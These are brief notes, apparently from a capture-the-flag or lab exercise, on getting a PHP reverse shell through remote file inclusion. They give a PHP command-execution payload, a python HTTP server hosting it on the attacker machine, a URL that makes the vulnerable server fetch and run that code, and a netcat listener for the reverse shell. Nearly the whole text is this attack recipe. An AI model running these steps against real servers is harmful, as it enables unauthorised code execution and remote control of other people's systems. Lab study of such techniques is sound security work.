- For reverse shell in php currently i have two options.

Option1: 

Step1: Create a php file with an instruction inside

└─$ cat hello.php    
<?php echo "Hello, World!"; ?>
or execute commands
<?php print exec('hostname'); ?>

Step2: Run a python server from that folder:
sudo python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.203.18 - - [06/Feb/2024 14:03:42] "GET /rev.php HTTP/1.1" 200 -


Step3: Specify it in the vulnerable server:
http://10.10.203.18/playground.php?file=http://10.14.70.188:8000/hello.php


Option2:
Step1: Download a reverse shell script, indicate port where your netcat is listening
Example:
nc -nvlp 4444
Step2: Turn on the python script inside same folder.
Step3:  Run the command
http://10.10.203.18/playground.php?file=http://10.14.70.188:8000/reverse-shell.php